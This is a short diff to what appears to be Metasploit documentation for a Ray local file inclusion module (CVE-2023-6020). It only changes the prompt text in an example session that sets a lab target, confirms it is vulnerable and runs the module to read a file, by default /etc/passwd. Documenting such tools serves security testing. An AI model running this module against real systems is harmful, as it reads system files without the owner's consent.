@@ -40,12 +40,12 @@ This is the file to read. Default is `/etc/passwd`.
 
 ### Ray (v2.6.3) installed with Docker on Kali Linux 6.6.15
 ```
-msf6 > use auxiliary/gather/ray_lfi_cve_2023_6020
-msf6 auxiliary(gather/ray_lfi_cve_2023_6020) > set rhost 192.168.56.6
+msf > use auxiliary/gather/ray_lfi_cve_2023_6020
+msf auxiliary(gather/ray_lfi_cve_2023_6020) > set rhost 192.168.56.6
 rhost => 192.168.56.6
-msf6 auxiliary(gather/ray_lfi_cve_2023_6020) > check
+msf auxiliary(gather/ray_lfi_cve_2023_6020) > check
 [+] 192.168.56.6:8265 - The target is vulnerable.
-msf6 auxiliary(gather/ray_lfi_cve_2023_6020) > run
+msf auxiliary(gather/ray_lfi_cve_2023_6020) > run
 [*] Running module against 192.168.56.6
 
 [*] Running automatic check ("set AutoCheck false" to disable)
